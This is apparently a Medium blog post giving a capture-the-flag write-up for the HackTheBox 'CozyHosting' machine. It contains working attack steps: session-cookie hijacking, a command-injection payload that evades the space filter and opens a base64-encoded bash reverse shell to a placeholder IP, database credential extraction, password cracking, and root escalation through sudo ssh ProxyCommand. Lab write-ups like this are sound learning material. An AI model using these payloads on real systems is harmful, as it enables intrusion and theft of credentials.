HackTheBox write up: “CozyHosting” Machine
==========================================

[![zerosandones](https://miro.medium.com/v2/resize:fill:88:88/1*8PgWCWtteykN7zPXDqImEQ.jpeg)

](https://medium.com/@ahmedgomaa_45441?source=post_page-----8b55beb59ace--------------------------------)

[zerosandones](https://medium.com/@ahmedgomaa_45441?source=post_page-----8b55beb59ace--------------------------------)

·

[Follow](https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fuser%2Fa3f1b2b68ccf&operation=register&redirect=https%3A%2F%2Fmedium.com%2F%40ahmedgomaa_45441%2Fhackthebox-write-up-cozyhosting-machine-8b55beb59ace&user=zerosandones&userId=a3f1b2b68ccf&source=post_page-a3f1b2b68ccf----8b55beb59ace---------------------post_header-----------)

5 min read·Just now

\--

Listen

Share

![image](https://github.com/ahmedgomaaa/HackTheBox-Writeups/assets/37199252/879cc2ee-bedc-448e-8f5a-1fdc65ee1e8c)


Welcome To HACKTHEBOX:CozyHosting machine writeup. It is an easy machine with a focus on web application vulnerabilities and privilage escalation vulnerabilities.

we first start by running a basic nmap scan against the machine ip

```
nmap -sV -sC 10.10.11.230 
```

We are using -sV and -sC here for probing the open ports and trying to get info about the version running by running it against default nmap scripts.

We can see here that we have port 22 and 80 open, which indicates the existance of web application running on port 80, and SSH service running on port 22, lets take a look at the web application

Web application

we can observe a web application with a login functionailty, we can visit and try testing for SQL Injection in the login page, but without success.

next step is to enumerate the web application for any hidden directories, we can use different tools, i personally prefer Dirsearch.

we found few intresting directories, by visiting them, we can find valuable information in the /actuator/sessions directory, as it contains session cookies for the users

And by trying to visit the /admin panel, and intercepting the requesting, modifying the session cookie and replacing it with the one we got from /actuator/sessions, we find that we get redirected to the admin dashboard with the admin “kanderson” logged in.

After a quick inspection to the dashboard we find that there is a feature to add a new host to the automatic patching.

After trying to submit data through it, and analyzing the requests in the burpsuite proxy, we find that the submit button calls and endpoint /excutessh

after poking with it alittle, we find that submitting single quote returns the following error:

```
http://cozyhosting.htb/admin?error=/bin/bash: -c: line 1: unexpected EOF while looking for matching \`''/bin/bash: -c: line 2: syntax error: unexpected end of file
```

which allows for the possibilty of command injection, lets try using our payload

```
echo "bash -i >& /dev/tcp/<your-ip>/<your-port> 0>&1" | base64 -w 0
```

we are going to base64 encode our payload that that we dont have to use spaces in the payload, as the application filters it out

```
;echo${IFS%??}"<your payload here>"${IFS%??}|${IFS%??}base64${IFS%??}-d${IFS%??}|${IFS%??}bash;
```

`${IFS%??}` Explanation:

*   `${IFS}`: This is a special shell variable in Unix-like operating systems that stands for "Internal Field Separator." By default, it is set to a space, tab, and newline characters. It's used by the shell to split lines into fields when processing commands.
*   `${IFS%??}`: This is a string manipulation construct in the shell. It trims the last two characters from the `${IFS}` variable. So, if `${IFS}` is set to the default value (space, tab, newline), `${IFS%??}` effectively removes the last two characters (newline and tab) and leaves only the space character, which is required for the payload to run correctly.

Additionally, as the web application may interpret the special characters differently or sanitize them to prevent malicious commands from being executed, we URLEncode our payload.

we start a listener and submit our payload, and we get a reverse connection

Upon listing looking for files, we find a directory named josh in the /home directory, but we cant access it, we can also see a .jar file in the /app, we download this file into our machine for futher inspection.

we can download it by running a python http.server and then using wget from our machine to download the file.

we can start inspecting this file using tool like jd-gui

after inspecting we can find that it contains postgres database credentials like the username and the password, so we try to login in to the postgres database using the commnads:

```
psql -h 127.0.0.1 -U postgres
``````
\\c cozyhosting
``````
\\d #to list availabe databases
``````
select \* from users; #To select all data in the users database
```

the passwords is hashed, we can try to crack it using john the ripper, with the following command, pointing to the wordlist to use ( in this case rockyou.txt will be sufficient )

```
john hash.txt --wordlist=/home/zeronull/rockyou.txt
```

now we can try to use this password to ssh into the machine using the user josh

```
ssh josh@10.10.11.230 
```

And we succesfully log in with the user josh, and we can access his directory, and access the user flag.txt

Privilege Escalation
====================

As for the root flag, we need to do Privilege Escalation in order to access the root directory.

we start by checking the allowed commands for our user to run as root without the passowrd, we check by running sudo -l

we see that we can run (root) /usr/bin/ssh \* as root without having to have the root password, lets check the GTFObins if we can abuse this to escalate our privileges to root.

we find:

and by running

```
sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
```

we get our root access successfully.

and thats how we get our root flag.
